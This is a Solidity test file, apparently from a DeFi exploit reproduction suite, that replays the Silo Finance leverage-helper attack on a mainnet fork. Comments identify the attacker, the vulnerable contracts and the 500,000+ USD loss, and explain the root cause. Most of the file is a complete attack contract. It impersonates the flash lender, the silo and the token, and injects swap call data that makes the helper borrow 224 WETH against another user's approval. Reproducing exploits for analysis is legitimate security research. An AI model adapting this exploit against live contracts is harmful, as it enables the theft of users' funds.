// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 500,000+ USD
// Attacker : 0x04377cfaf4b4a44bb84042218cdda4cebcf8fd62
// Attack Contract : 0x79c5c002410a67ac7a0cde2c2217c3f560859c7e
// Vulnerable Contract : 0x160287e2d3fdcde9e91317982fc1cc01c1f94085
// Attack Tx : https://etherscan.io/tx/0x1f15a193db3f44713d56c4be6679b194f78c2bcdd2ced5b0c7495b7406f5e87a
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x160287e2d3fdcde9e91317982fc1cc01c1f94085#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1356
//
// Attack summary: the attacker called the public Silo leverage helper with a contract that pretended
// to be the flash lender, the collateral silo, and the collateral token. During the fake flash-loan
// callback, the fake lender supplied new swap data that made the helper call the real WETH silo as an
// arbitrary exchange proxy.
// Root cause: the leverage helper trusted user supplied swap targets and Silo-like targets without
// constraining them to the selected Silo market. Any borrower that had granted the helper debt receive
// approval could therefore be borrowed against by routing a swap callback into `Silo.borrow`.

address constant ATTACKER = address(uint160(0x0004377cfaf4b4a44bb84042218cdda4cebcf8fd62));
address constant HISTORICAL_ATTACK_CONTRACT = address(uint160(0x0079c5c002410a67ac7a0cde2c2217c3f560859c7e));
address constant SILO_LEVERAGE_HELPER = address(uint160(0x00cbee4617abf667830fe3ee7dc8d6f46380829df9));
address constant WETH_SILO = address(uint160(0x00160287e2d3fdcde9e91317982fc1cc01c1f94085));
address constant COLLATERAL_BORROWER = address(uint160(0x0060baf994f44dd10c19c0c47cbfe6048a4ffe4860));
address constant WETH_TOKEN = address(uint160(0x00c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2));

uint256 constant BORROW_AMOUNT = 224 ether;
uint256 constant HISTORICAL_DEBT_SHARES = 223_975_555_653_555_068_856;

interface ISilo1356 {
    function borrow(uint256 assets, address receiver, address borrower) external returns (uint256 shares);
}

interface IERC3156FlashBorrower1356 {
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32);
}

interface ILeverageHelper1356 {
    struct FlashArgs {
        address flashloanTarget;
        uint256 amount;
    }

    struct DepositArgs {
        address silo;
        uint256 amount;
        uint8 collateralType;
    }

    function openLeveragePosition(
        FlashArgs calldata flashArgs,
        bytes calldata swapArgs,
        DepositArgs calldata depositArgs
    ) external payable;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_781_961);
        vm.roll(22_781_962);
        vm.warp(0x685c038b);

        fundingToken = WETH_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(SILO_LEVERAGE_HELPER, "Silo leverage helper");
        vm.label(WETH_SILO, "WETH Silo");
        vm.label(COLLATERAL_BORROWER, "Collateral borrower");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerWethBefore = IERC20(WETH_TOKEN).balanceOf(ATTACKER);

        SiloFinanceAttack attack = new SiloFinanceAttack(ATTACKER);

        vm.prank(ATTACKER);
        uint256 debtShares = attack.execute();

        assertEq(IERC20(WETH_TOKEN).balanceOf(ATTACKER) - attackerWethBefore, BORROW_AMOUNT);
        assertEq(debtShares, HISTORICAL_DEBT_SHARES);
    }
}

contract SiloFinanceAttack {
    struct SwapArgs {
        address exchangeProxy;
        address sellToken;
        address buyToken;
        address allowanceTarget;
        bytes swapCallData;
    }

    address private immutable profitReceiver;
    uint256 public debtShares;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    function execute() external returns (uint256) {
        ILeverageHelper1356.FlashArgs memory flashArgs =
            ILeverageHelper1356.FlashArgs({flashloanTarget: address(this), amount: 0});
        ILeverageHelper1356.DepositArgs memory depositArgs =
            ILeverageHelper1356.DepositArgs({silo: address(this), amount: 0, collateralType: 1});

        ILeverageHelper1356(SILO_LEVERAGE_HELPER).openLeveragePosition(flashArgs, bytes(""), depositArgs);

        return debtShares;
    }

    function flashLoan(
        IERC3156FlashBorrower1356 receiver,
        address token,
        uint256 amount,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == SILO_LEVERAGE_HELPER, "unexpected helper");
        require(token == address(this) && amount == 0, "unexpected flash args");

        SwapArgs memory swapArgs = SwapArgs({
            exchangeProxy: WETH_SILO,
            sellToken: address(this),
            buyToken: address(this),
            allowanceTarget: address(this),
            swapCallData: abi.encodeWithSelector(
                ISilo1356.borrow.selector, BORROW_AMOUNT, profitReceiver, COLLATERAL_BORROWER
            )
        });

        ILeverageHelper1356.DepositArgs memory depositArgs =
            ILeverageHelper1356.DepositArgs({silo: address(this), amount: 0, collateralType: 1});

        bytes32 callbackResult = receiver.onFlashLoan({
            initiator: address(this),
            token: address(this),
            amount: 0,
            fee: 0,
            data: abi.encode(abi.encode(swapArgs), depositArgs)
        });
        require(callbackResult == keccak256("ERC3156FlashBorrower.onFlashLoan"), "callback failed");

        return true;
    }

    function asset() external view returns (address) {
        return address(this);
    }

    function config() external view returns (address) {
        return address(this);
    }

    function getSilos() external view returns (address silo0, address silo1) {
        return (address(this), address(this));
    }

    function balanceOf(
        address account
    ) external view returns (uint256) {
        if (account == SILO_LEVERAGE_HELPER) return 1;
        return 0;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 0;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function deposit(uint256 assets, address receiver, uint8 collateralType) external pure returns (uint256 shares) {
        require(assets == 1 && receiver != address(0) && collateralType == 1, "unexpected fake deposit");
        return 0;
    }

    function borrow(uint256 assets, address receiver, address borrower) external returns (uint256 shares) {
        require(assets == 0 && receiver == SILO_LEVERAGE_HELPER && borrower == address(this), "unexpected fake borrow");
        debtShares = HISTORICAL_DEBT_SHARES;
        return 0;
    }
}
